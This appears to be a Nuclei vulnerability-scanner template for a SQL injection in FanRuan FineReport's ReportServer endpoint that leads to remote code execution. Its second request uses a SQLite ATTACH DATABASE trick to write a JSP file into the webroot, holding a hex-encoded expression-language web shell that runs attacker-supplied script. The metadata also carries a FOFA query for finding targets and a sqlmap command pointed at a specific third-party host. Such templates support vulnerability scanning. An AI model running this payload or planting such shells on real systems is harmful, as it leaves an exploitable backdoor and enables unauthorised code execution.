id: fanruan-finereport-sqli-rce

info:
  name: FineReport SQLi - Remote Code Execution
  author: adeljck
  severity: critical
  description: Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
  metadata:
    verified: true
    fofa-query: app="帆软-FineReport"
    sqlmap: sqlmap -u "https://fdl.jgsteel.cn/webroot/decision/view/ReportServer?{{string}}=&n=1" -p 'n' --batch --random-agent
  tags: finereport,rce,sqli,fanruan

variables:
  string: '{{rand_base(8, "abc")}}'

http:
  - raw:
      - |
        GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,123)} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

      - |+
        GET /webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Faaa.jsp%27%20as%20gggggg%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20gggggg.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20gggggg.exp2%28data%29%20VALUES%20%28x%27247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d%27%29%3B'),1,1)} HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

      - |+
        GET /webroot/aaa.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Accept-Encoding: gzip, deflate, br
        Accept: */*

    matchers-condition: and
    matchers:
      - type: word
        part: location_1
        words:
          - 'report?{{string}}&n=1147'

      - type: status
        part: header_1
        status:
          - 200
          - 302
        condition: or
      
      - type: status
        part: header_2
        status:
          - 200
          - 302
        condition: or

      - type: dsl
        dsl:
          - status_code_3 == 500